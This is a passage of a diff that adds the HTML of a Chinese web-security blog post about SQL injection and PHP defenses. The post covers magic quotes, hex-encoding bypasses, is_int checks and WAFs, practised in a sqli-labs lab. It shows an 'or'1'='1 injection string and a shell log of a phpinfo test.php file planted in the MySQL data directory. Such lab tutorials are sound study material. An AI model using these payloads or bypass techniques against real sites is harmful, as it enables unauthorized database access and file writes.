+root@06026a1599f9:/var/lib/mysql<span class="token comment" spellcheck="true"># ls -l test.php</span>
+-rw-rw-rw- 1 mysql mysql 23 Jun 18 12:17 test.php
+root@06026a1599f9:/var/lib/mysql<span class="token comment" spellcheck="true"># cat test.php</span>
+1       <span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span> ?<span class="token operator">></span>      3
+root@06026a1599f9:/var/lib/mysql<span class="token comment" spellcheck="true">#</span>
+</code></pre>
+<h3 id="四、魔术引号开关"><a href="#四、魔术引号开关" class="headerlink" title="四、魔术引号开关"></a><font size="5"><strong>四、魔术引号开关</strong></font></h3><p>魔术引号设计的初衷是为了让从数据库或文件中读取数据和从请求中接收参数时，<font color=" red"><strong>对单引号、双引号、反斜线、NULL加上一个一个反斜线进行转义</strong></font>，这个的作用跟addslashes()的作用完全相同。</p>
+<p>正确地接收和读取数据，从而正确地执行SQL语句，防止恶意的SQL注入。</p>
+<p>简单的SQL注入示例，假设有一个数据库user，我们要传一个参数查询某个用户的信息，我们会调用某个接口，传一个参数给接口，类似于http:&#x2F;&#x2F;域名&#x2F;?c&#x3D;xxx&amp;a&#x3D;xxx&amp;user&#x3D;xxx，现在我们想查询一个叫codeman的人的信息，那么user&#x3D;codeman，后台接收到参数之后，执行类似于下面的SQL语句。</p>
+<pre class=" language-bash"><code class="language-bash">SELECT * FROM <span class="token variable"><span class="token variable">`</span>user<span class="token variable">`</span></span> WHERE <span class="token variable"><span class="token variable">`</span>user<span class="token variable">`</span></span> <span class="token operator">=</span> <span class="token string">'codeman'</span><span class="token punctuation">;</span>
+</code></pre>
+<p>如果在接收数据时后台不进行转义，那么久可能让恶意的SQL注入攻击发生，假设我们现在传递一个user&#x3D;codeman’or’1’&#x3D;’1，传到后台执行的SQL语句变成：</p>
+<pre class=" language-bash"><code class="language-bash">SELECT * FROM <span class="token variable"><span class="token variable">`</span>user<span class="token variable">`</span></span> WHERE <span class="token variable"><span class="token variable">`</span>user<span class="token variable">`</span></span> <span class="token operator">=</span> <span class="token string">'codeman'</span> or <span class="token string">'1'</span> or <span class="token string">'1'</span><span class="token punctuation">;</span>
+</code></pre>
+<h3 id="●-1、为什么在PHP5-4-0及其之后PHP版本中被取消了呢"><a href="#●-1、为什么在PHP5-4-0及其之后PHP版本中被取消了呢" class="headerlink" title="● 1、为什么在PHP5.4.0及其之后PHP版本中被取消了呢?"></a><font size="4"><strong>● 1、为什么在PHP5.4.0及其之后PHP版本中被取消了呢?</strong></font></h3><pre class=" language-bash"><code class="language-bash">PHP 5.5.9-1ubuntu4.13 <span class="token punctuation">(</span>cli<span class="token punctuation">)</span> <span class="token punctuation">(</span>built: Sep 29 2015 15:24:49<span class="token punctuation">)</span>
+Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 1997-2014 The PHP Group
+Zend Engine v2.5.0, Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 1998-2014 Zend Technologies
+   with Zend OPcache v7.0.3, Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 1999-2014, by Zend Technologies
+root@06026a1599f9:/<span class="token comment" spellcheck="true"># grep magic /etc/php5/apache2/php.ini</span>
+root@06026a1599f9:/<span class="token comment" spellcheck="true"># grep magic /etc/php5/cli/php.ini</span>
+</code></pre>
+<p>(1)可移植性:<br>编程时认为其打开或并闭都会影响到移植性。可以用 get_magic_quotes_gpc() 来检查是否打开，并据此编程。 </p>
+<p>(2）性能<br>        由于并不是每一段被转义的数据都要插入数据库的，如果所有进入 PHP 的数据都被转义的话，那么会对程序的执行效率产生一定的影响。在运行时调用转义函数（如 addslashes()）更有效率。 尽管 php.ini-dist 默认打开了这个选项，但是 php.ini-recommended 默认却关闭了它，主要是出于性能的考虑。</p>
+<p>（3）方便<br>由于不是所有数据都需要转义，在不需要转义的地方看到转义的数据就很烦。比如说通过表单发送邮件，结果看到一大堆的 ‘。针对这个问题，可以使用 stripslashes() 函数处理。</p>
+<h3 id="●-2、phpstudy环境中PHP版本选择为5-2-17时在php-ini文件中魔术引号的开关"><a href="#●-2、phpstudy环境中PHP版本选择为5-2-17时在php-ini文件中魔术引号的开关" class="headerlink" title="● 2、phpstudy环境中PHP版本选择为5.2.17时在php.ini文件中魔术引号的开关"></a><font size="4"><strong>● 2、phpstudy环境中PHP版本选择为5.2.17时在php.ini文件中魔术引号的开关</strong></font></h3><p><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/13.png"></p>
+<p>选择SQL注入的关卡1阅读源码$sql&#x3D;”SELECT * FROM users WHERE id&#x3D;’$id’ LIMIT 0,1”;这一句中我们要是想注入的话必须让前面的’闭合，但是我们开启了魔术引号开关我发生这样的事情。</p>
+<p><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/14.png"></p>
+<p>就是在我们注入的时候添加的’会在之后会自动添加&#39;将我们注入语句给注释掉从而失败。将魔术引号关闭之后然后重启phpstudy就可以正常的注入。<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/15.png"><br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/16.png"></p>
+<h3 id="●-3、由于docker搭建的环境是PHP5-5版本的没有魔术引号、故不做演示"><a href="#●-3、由于docker搭建的环境是PHP5-5版本的没有魔术引号、故不做演示" class="headerlink" title="● 3、由于docker搭建的环境是PHP5.5版本的没有魔术引号、故不做演示"></a><font size="4"><strong>● 3、由于docker搭建的环境是PHP5.5版本的没有魔术引号、故不做演示</strong></font></h3><p>开启了魔术引号之后<br><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/16.png"></p>
+<h3 id="●-4、绕过方法"><a href="#●-4、绕过方法" class="headerlink" title="● 4、绕过方法"></a><font size="4"><strong>● 4、绕过方法</strong></font></h3><p>采用<font color=" red"><strong>hex(16进制)</strong></font>编码绕过因为对路径进行编码之后魔术引号不会再对其生效也就是说绕过了魔术引号的作用达到绕过。<br>编码软件:winhex</p>
+<h3 id="五、int函数"><a href="#五、int函数" class="headerlink" title="五、int函数"></a><font size="5"><strong>五、int函数</strong></font></h3><p>对输入的数字进行判断是否</p>
+<pre class=" language-bash"><code class="language-bash">if<span class="token punctuation">(</span>is_int<span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>
+    <span class="token variable">$result</span><span class="token operator">=</span>mysql_query<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>
+    <span class="token keyword">echo</span> <span class="token string">'ni shi ge jj?'</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+</code></pre>
+<p><img src="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/16.png"></p>
+<p>防护软件一般也是对关键字进行防护、触发了waf等安全软件规则会将数据包丢弃。</p>
+
                 
             </div>
             <hr/>
@@ -556,7 +893,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">web安全</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -777,7 +1118,7 @@
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            WEB漏洞-SQL 注入
+                            WEB漏洞-SQL 注入(一)
                         
                     </div>
                     <div class="publish-info">
@@ -1040,7 +1381,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">15.8k</span>&nbsp;字
+                class="white-color">18.7k</span>&nbsp;字
             
             
             
